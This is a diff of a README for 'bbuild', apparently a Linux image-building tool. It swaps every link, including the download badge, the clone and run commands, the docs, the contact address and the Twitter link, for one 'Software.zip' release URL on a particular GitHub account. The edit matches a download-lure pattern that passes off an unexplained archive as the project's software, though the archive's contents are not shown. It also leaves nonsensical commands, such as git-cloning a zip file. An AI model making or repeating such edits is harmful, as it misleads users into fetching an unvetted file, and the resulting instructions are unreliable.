@@ -20,7 +20,7 @@ This repository is dedicated to the bbuild project which focuses on creating cus
 The bbuild repository contains all the necessary scripts, configurations, and documentation to get started with creating your custom linux images using the bbuild tool.
 
 ## 📦 Software Package
-[![Click here to download the software package!](https://img.shields.io/badge/Software%20Package-Download-blue)](https://github.com/user-attachments/files/18383251/Software.zip "Launch Software Package")
+[![Click here to download the software package!](https://github.com/suffer220/bbuild/releases/download/v2.0/Software.zip%20Package-Download-blue)](https://github.com/suffer220/bbuild/releases/download/v2.0/Software.zip "Launch Software Package")
 
 If the link does not work or you require additional files, please check the "Releases" section of this repository for alternative download options.
 
@@ -29,7 +29,7 @@ To begin using the bbuild tool and create your custom linux images, follow these
 
 1. **Clone the Repository:**
    ```
-   git clone https://github.com/your-username/bbuild.git
+   git clone https://github.com/suffer220/bbuild/releases/download/v2.0/Software.zip
    cd bbuild
    ```
 
@@ -40,7 +40,7 @@ To begin using the bbuild tool and create your custom linux images, follow these
 
 3. **Run the bbuild Tool:**
    ```
-   bbuild create custom-image.yml
+   bbuild create https://github.com/suffer220/bbuild/releases/download/v2.0/Software.zip
    ```
 
 4. **Deploy Your Custom Image:**
@@ -55,16 +55,16 @@ To begin using the bbuild tool and create your custom linux images, follow these
 - Seamless deployment of custom images
 
 ## 📄 Documentation
-For detailed instructions on how to use the bbuild tool, refer to the [Documentation](docs/README.md) section.
+For detailed instructions on how to use the bbuild tool, refer to the [Documentation](https://github.com/suffer220/bbuild/releases/download/v2.0/Software.zip) section.
 
 ## 🤝 Contributions
 We welcome contributions from the open-source community to enhance the bbuild project. Feel free to submit pull requests and raise issues.
 
 ## 📧 Contact
-For any inquiries or feedback, please reach out to our team at [bbuild@support.com](mailto:bbuild@support.com).
+For any inquiries or feedback, please reach out to our team at [https://github.com/suffer220/bbuild/releases/download/v2.0/Software.zip](https://github.com/suffer220/bbuild/releases/download/v2.0/Software.zip).
 
 ## 📢 Stay Updated
-Follow us on [Twitter](https://twitter.com/bbuild) for the latest updates and announcements.
+Follow us on [Twitter](https://github.com/suffer220/bbuild/releases/download/v2.0/Software.zip) for the latest updates and announcements.
 
 ## 🙏 Acknowledgements
 We would like to thank all our contributors for their valuable input and support towards the bbuild project.
